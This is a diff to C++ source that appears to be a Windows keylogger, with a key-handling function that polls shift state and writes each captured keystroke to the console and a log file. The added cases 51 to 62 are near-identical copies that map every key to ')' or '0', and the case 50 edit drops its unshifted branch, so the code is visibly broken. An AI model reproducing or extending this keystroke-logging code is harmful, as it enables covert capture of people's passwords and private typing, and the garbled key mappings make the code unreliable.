@@ -58,13 +58,164 @@ bool Key_is_Listed(WORD iKey)
 	case 50:
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
-			std::cout << "@";
-			WriteToFile("@");
+			std::cout << "2";
+			WriteToFile("2");
+		}
+		break;
+
+	case 51:
+		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
+		{
+			std::cout << ")";
+			WriteToFile(")");
 		}
 		else
 		{
-			std::cout << "2";
-			WriteToFile("2");
+			std::cout << "0";
+			WriteToFile("0");
+		}
+		break;
+
+	case 52:
+		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
+		{
+			std::cout << ")";
+			WriteToFile(")");
+		}
+		else
+		{
+			std::cout << "0";
+			WriteToFile("0");
+		}
+		break;
+
+	case 53:
+		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
+		{
+			std::cout << ")";
+			WriteToFile(")");
+		}
+		else
+		{
+			std::cout << "0";
+			WriteToFile("0");
+		}
+		break;
+
+	case 54:
+		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
+		{
+			std::cout << ")";
+			WriteToFile(")");
+		}
+		else
+		{
+			std::cout << "0";
+			WriteToFile("0");
+		}
+		break;
+
+	case 55:
+		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
+		{
+			std::cout << ")";
+			WriteToFile(")");
+		}
+		else
+		{
+			std::cout << "0";
+			WriteToFile("0");
+		}
+		break;
+
+	case 56:
+		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
+		{
+			std::cout << ")";
+			WriteToFile(")");
+		}
+		else
+		{
+			std::cout << "0";
+			WriteToFile("0");
+		}
+		break;
+
+	case 57:
+		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
+		{
+			std::cout << ")";
+			WriteToFile(")");
+		}
+		else
+		{
+			std::cout << "0";
+			WriteToFile("0");
+		}
+		break;
+
+	case 58:
+		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
+		{
+			std::cout << ")";
+			WriteToFile(")");
+		}
+		else
+		{
+			std::cout << "0";
+			WriteToFile("0");
+		}
+		break;
+
+	case 59:
+		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
+		{
+			std::cout << ")";
+			WriteToFile(")");
+		}
+		else
+		{
+			std::cout << "0";
+			WriteToFile("0");
+		}
+		break;
+
+	case 60:
+		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
+		{
+			std::cout << ")";
+			WriteToFile(")");
+		}
+		else
+		{
+			std::cout << "0";
+			WriteToFile("0");
+		}
+		break;
+
+	case 61:
+		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
+		{
+			std::cout << ")";
+			WriteToFile(")");
+		}
+		else
+		{
+			std::cout << "0";
+			WriteToFile("0");
+		}
+		break;
+
+	case 62:
+		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
+		{
+			std::cout << ")";
+			WriteToFile(")");
+		}
+		else
+		{
+			std::cout << "0";
+			WriteToFile("0");
 		}
 		break;
 
